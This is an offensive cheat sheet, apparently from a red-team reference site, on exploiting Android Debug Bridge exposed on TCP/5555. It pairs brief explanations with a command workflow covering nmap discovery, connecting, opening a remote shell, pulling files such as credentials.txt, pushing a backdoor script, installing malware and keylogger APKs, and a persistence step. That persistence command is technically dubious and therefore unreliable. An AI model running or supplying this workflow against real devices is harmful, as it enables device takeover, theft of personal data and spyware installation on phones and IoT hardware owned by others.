ADB (Android Debug Bridge) Exploitation

Domain: Mobile & IoT Security • Focus: ADB Remote Shell Abuse • Last Updated: 2025-09-05

Summary

ADB (Android Debug Bridge, TCP/5555) is a tool used for debugging Android devices. When left exposed over the network, it often requires no authentication, giving attackers direct root shell access. Exploitation includes device takeover, data exfiltration, malware installation, and lateral movement in IoT ecosystems. Misconfigured ADB endpoints have been widely abused in botnets and cryptojacking campaigns. In Red Team ops, ADB exploitation provides a stealthy way to persist inside compromised environments.

Why Exploitable

  • No Authentication: Exposed ADB allows shell access without credentials.
  • Default Root Access: Many IoT/Android devices run ADB as root.
  • Remote File System Access: Attackers can push/pull arbitrary files.
  • Malware Deployment: APKs can be installed silently via ADB.
  • Persistence: Attackers can leave backdoors or scripts for re-entry.

How Exploitation Works

  1. Discovery: Scan for open TCP/5555 services.
  2. Connection: Use adb client to connect to the device.
  3. Shell Access: Gain root shell via adb shell.
  4. Exploitation: Pull sensitive data, install malware, or maintain persistence.
  5. Impact: Full compromise of Android/IoT devices.

Steps

  1. Scan network for ADB service on TCP/5555.
  2. Connect using adb client.
  3. Spawn a remote shell.
  4. Exfiltrate sensitive files or dump data.
  5. Install malicious APKs or drop persistence scripts.

Commands


# ------------------------------
# Discovery
# ------------------------------
nmap -p5555 -sV [target]                   # Scan for ADB
adb devices -l                             # List devices connected

# ------------------------------
# Connect to Device
# ------------------------------
adb connect [target]:5555
adb devices -l

# ------------------------------
# Remote Shell Access
# ------------------------------
adb -s [target]:5555 shell
id
whoami

# ------------------------------
# File Transfer
# ------------------------------
adb -s [target]:5555 pull /sdcard/DCIM/data.jpg
adb -s [target]:5555 push backdoor.sh /data/local/tmp/

# ------------------------------
# Install Malicious APK
# ------------------------------
adb -s [target]:5555 install malware.apk

# ------------------------------
# Persistence
# ------------------------------
adb -s [target]:5555 shell 'echo "adb shell" >> /etc/init.d/startup.sh'

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p5555 -sV 192.168.1.100
adb connect 192.168.1.100:5555
adb shell
id
adb pull /sdcard/Documents/credentials.txt
adb install keylogger.apk
